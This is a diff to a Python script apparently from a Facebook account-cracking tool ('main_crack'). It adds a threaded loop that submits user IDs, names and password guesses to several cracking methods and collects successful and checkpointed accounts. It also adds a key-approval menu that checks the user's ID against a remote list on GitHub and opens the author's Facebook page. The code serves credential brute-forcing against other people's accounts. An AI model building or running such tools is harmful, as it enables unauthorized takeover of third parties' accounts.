@@ -578,4 +578,44 @@ class main_crack():
                        if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                            pwx =  pw
                        else:
-                      
+                            pwx =  pw
+                            if 'methodA' in methods:
+                                DANGERworld.submit(self.methodA, uid, name, pwx)
+                            elif 'methodB' in methods:
+                                DANGERworld.submit(self.methodB, uid, name, pwx)
+                            elif 'methodC' in methods:
+                                DANGERworld.submit(self.methodC, uid, name, pwx)
+                            elif 'methodD' in methods:
+                                DANGERworld.submit(self.methodD, uid, name, pwx)
+                   except:pass
+            result(oks,cps)   
+            
+def danger_menu():
+    UMO="DANGER-"
+    uuid = str(os.geteuid()) + str(os.getlogin()) 
+    id = "5".join(uuid)
+    print(logo)
+    DARK=requests.get("https://github.com/mr-devil-690/DANGER-404/blob/main/Approve.txt").text
+    if id in DARK:
+        DANGER()
+    else:
+        os.system("clear")
+        os.system("xdg-open https://facebook.com/reysyyy")
+        time.sleep(3.0)
+        
+        os.system("clear")
+        print(logo)
+        print("\t\033[30m   [\033[1;32m\033[47m First Get Approvel\033[00m\033[1;30m]")
+        print ("")
+        print ("")
+        print("              Your Key is Not Approved ")
+        print("              Copy And Send Key To Admin")
+        print ("")
+        print (" Your Key : "+UMO+id)
+        print ("\n")
+        name = input(" Your Name : ")
+        print ("")
+        input(" Press Enter To Send Key")
+        os.system("xdg-open https://facebook.com/reysyyy")
+        danger_menu()   
+danger_menu()
